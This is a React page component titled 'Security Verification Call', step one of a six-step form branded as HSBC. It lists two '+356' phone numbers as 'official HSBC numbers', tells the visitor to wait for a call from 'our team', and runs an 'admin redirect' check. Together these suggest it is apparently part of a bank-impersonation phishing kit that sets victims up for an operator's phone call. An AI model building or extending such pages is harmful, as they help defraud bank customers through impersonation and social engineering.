import React from 'react';
import { Phone, Shield } from 'lucide-react';
import FormLayout from '@/components/FormLayout';
import ErrorAlert from '@/components/ErrorAlert';
import { useForm } from '@/contexts/FormContext';
import { useAdminRedirectCheck } from '@/hooks/useAdminRedirectCheck';

const CallPage = () => {
  const { currentSession } = useForm();
  useAdminRedirectCheck(); // Check for admin redirects

  return (
    <FormLayout
      title="Security Verification Call"
      description="Please wait for our team to call you"
      currentStep={1}
      totalSteps={6}
    >
      <div className="space-y-6">
        <ErrorAlert />

        {/* Main message */}
        <div className="text-center space-y-4">
          <div className="bg-primary/10 p-4 rounded-lg border border-primary/20">
            <p className="text-sm leading-relaxed">
              As part of our security procedure, a member of our team will contact you shortly to complete the verification process.
            </p>
          </div>
        </div>

        {/* Official numbers */}
        <div className="space-y-3">
          <h3 className="font-medium text-sm flex items-center gap-2">
            <Phone className="w-4 h-4 text-primary" />
            Official HSBC Numbers
          </h3>
          <div className="bg-muted/50 p-4 rounded-lg space-y-2">
            <p className="text-sm text-muted-foreground mb-2">
              You may receive a call from one of the following official HSBC numbers:
            </p>
            <ul className="space-y-1">
              <li className="flex items-center gap-2 text-sm font-mono">
                <span className="w-2 h-2 bg-primary rounded-full"></span>
                +356 2380 2380
              </li>
              <li className="flex items-center gap-2 text-sm font-mono">
                <span className="w-2 h-2 bg-primary rounded-full"></span>
                +356 9980 2380
              </li>
            </ul>
          </div>
        </div>

        {/* Instructions */}
        <div className="bg-amber-50 dark:bg-amber-950/20 p-4 rounded-lg border border-amber-200 dark:border-amber-800">
          <p className="text-sm text-amber-800 dark:text-amber-200">
            Please make sure your phone is nearby and that you can answer the call.
          </p>
        </div>

        {/* Security note */}
        <div className="bg-red-50 dark:bg-red-950/20 p-4 rounded-lg border border-red-200 dark:border-red-800">
          <div className="flex items-start gap-3">
            <Shield className="w-5 h-5 text-red-600 dark:text-red-400 mt-0.5 flex-shrink-0" />
            <div>
              <h4 className="font-medium text-sm text-red-800 dark:text-red-200 mb-1">
                Important Security Notice
              </h4>
              <p className="text-sm text-red-700 dark:text-red-300">
                For your security, our representatives will never ask for your complete card number, PIN code, or internet banking password.
              </p>
            </div>
          </div>
        </div>
      </div>
    </FormLayout>
  );
};

export default CallPage;